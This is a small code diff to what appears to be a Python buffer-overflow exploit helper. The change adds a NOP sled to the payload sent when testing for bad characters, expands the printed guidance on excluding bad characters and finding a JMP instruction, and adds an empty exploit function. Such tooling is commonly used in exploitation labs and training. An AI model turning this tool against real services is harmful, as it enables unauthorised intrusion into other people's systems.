@@ -125,7 +125,7 @@ def find_eip_offset(host,port,prefix,offset,retn,length):
 
 def send_bad_chars(host,port,prefix,offset,retn,length,bad_chars):
     overflow = "A" * offset
-    padding = ""
+    padding = "\x90" * 16
     payload = ""
     print("[*] Excluding: %s" % bad_chars)
     bad_chars_in_integer_form = []
@@ -138,7 +138,12 @@ def send_bad_chars(host,port,prefix,offset,retn,length,bad_chars):
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
     send_bof(bof,host,port)
-    print("[!] Next step: Find a JMP instruction to redirect program execution.")
+    print("[!] Next steps:")
+    print(" -  Check which bad characters caused a memory corruption and exclude them (one at a time) from the next run.")
+    print(" -  If there were none, find a JMP instruction to redirect program execution.")
+
+def exploit():
+    payload = ""
 
 if __name__ == "__main__":
     if args.generate_config_template:
